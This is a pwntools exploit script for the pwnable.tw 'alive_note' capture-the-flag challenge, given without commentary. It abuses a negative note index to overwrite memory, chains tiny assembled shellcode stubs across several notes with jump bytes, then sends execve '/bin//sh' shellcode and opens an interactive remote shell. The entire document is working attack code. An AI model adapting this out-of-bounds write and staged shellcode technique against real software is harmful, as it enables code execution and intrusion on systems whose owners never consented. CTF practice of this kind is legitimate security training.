from pwn import *

context.arch = 'i386'

r = remote('chall.pwnable.tw', 10300)
#r = process('./alive_note')

def add_note(idx, payload):
    r.sendlineafter(':', '1')
    r.sendlineafter(':', str(idx))
    r.sendafter(':', payload.ljust(8,'\x00'))


def add_useless_note():
    add_note(1, '')
    add_note(1, '')
    add_note(1, '')

payload1 = """
pop eax
pop edx
xor ax, 0x384e
"""

payload2 = """
push edx
xor ax,0x3461
push eax
"""

payload3 = """
pop edx
pop eax
xor BYTE PTR[eax], dh
inc ecx
inc ecx
"""

payload4 = """
push 0x6a
push eax
push ebx
push eax
push edx
"""

shellcode = """
xor eax,eax
xor edx, edx
push eax
push 0x68732f2f
push 0x6e69622f
mov ebx, esp
push eax
push eax
push ebx
mov ecx, esp
mov al, 0xb
int 0x80
"""

je = '\x75\x38'


#0
add_note(-27, asm(payload1)+je)
add_useless_note()
#4
add_note(0, asm(payload2)+je)
add_useless_note()
#8
add_note(0, asm(payload3)+je)
add_useless_note()
#c
add_note(0, asm(payload4)+je)
add_useless_note()
#0
add_note(0, '\x47')

r.sendlineafter(':', '3')
r.sendlineafter(':', '0')
r.send(asm(shellcode))


r.interactive()
